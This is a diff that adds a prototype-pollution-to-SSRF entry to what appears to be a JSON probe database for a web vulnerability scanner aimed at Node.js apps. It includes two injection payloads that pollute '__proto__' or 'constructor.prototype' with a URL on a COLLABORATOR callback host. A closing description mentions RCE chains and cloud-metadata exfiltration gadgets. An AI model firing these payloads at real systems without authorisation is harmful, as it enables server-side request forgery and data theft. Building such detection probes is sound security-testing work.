@@ -898,6 +898,50 @@
           "confidence_boost": 65
         }
       ]
+    },
+    "protopollution_to_ssrf_chain": {
+      "description": "Prototype pollution \u2192 SSRF chain. Deep-merge on user-controlled JSON pollutes a URL property (ogImage, webhookUrl, callbackUrl, previewUrl, avatarUrl) that the server fetches. Common in Node.js apps with lodash.merge, deepmerge, or Object.assign. ASIS CTF 2026 Portalis pattern.",
+      "tech_match": [
+        "node",
+        "nodejs",
+        "express",
+        "next",
+        "nextjs"
+      ],
+      "param_match": [
+        "theme",
+        "config",
+        "settings",
+        "profile",
+        "options",
+        "preferences"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"outputUrl\":\"http://COLLABORATOR/pp-ssrf\"}}",
+          "description": "Pollute a URL property via __proto__. If the server fetches the polluted URL, Collaborator interaction confirms SSRF.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "COLLABORATOR"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"href\":\"http://COLLABORATOR/pp-chain\"}}}",
+          "description": "Alternative pollution path via constructor.prototype. Targets libraries that check __proto__ but not constructor.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "COLLABORATOR"
+              ]
+            }
+          ]
+        }
+      ]
     }
   },
   "description": ". v1.0 black-box variants: Express default-property pollution (json spaces / status), Fastify AJV pollution, Hapi event pollution, exec_argv RCE chain, side-channel sentinel detection. 2026 H2: axios PP gadget (CVE-2026-40175) for cloud-metadata exfil + proxy hijack; n8n core-node PP (CVE-2026-44789/90/91)."
